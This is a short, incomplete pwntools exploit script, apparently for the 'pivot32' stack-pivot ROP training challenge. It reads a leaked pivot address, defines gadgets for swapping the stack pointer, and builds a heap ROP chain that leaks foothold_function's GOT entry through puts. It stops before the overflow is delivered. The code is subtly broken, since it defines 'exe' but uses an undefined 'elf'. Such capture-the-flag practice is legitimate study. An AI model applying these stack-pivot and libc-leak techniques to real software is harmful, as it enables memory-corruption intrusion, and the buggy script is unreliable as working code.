from pwn import *

#trying to "pivot"(i.r move around esp) so that a longer stack chain can
#be inserted, if stack space is somehow limited(???)

exe = context.binary = ELF("./pivot32",checksec=False)
context.log_level = 'info'

foothold_plt = elf.plt['foothold_function']
foothold_got = elf.got['foothold_function']
puts_plt = elf.plt['puts']

p = process()
p.recvuntil("pivot: ")
pivot_addr = int(p.recvuntil('\n').strip(),16)

foothold_offset = 0x77d
ret2win_offset = 0x974
#theoretically - any function from libc can be called
#or a libc "one gadget" could be used

pop_eax = 0x0804882c  
xchg_eax_esp = 0x0804882e

heap_payload = flat(
    foothold_plt,
    puts_plt,
    elf.symbols.main,
    foothold_got
)


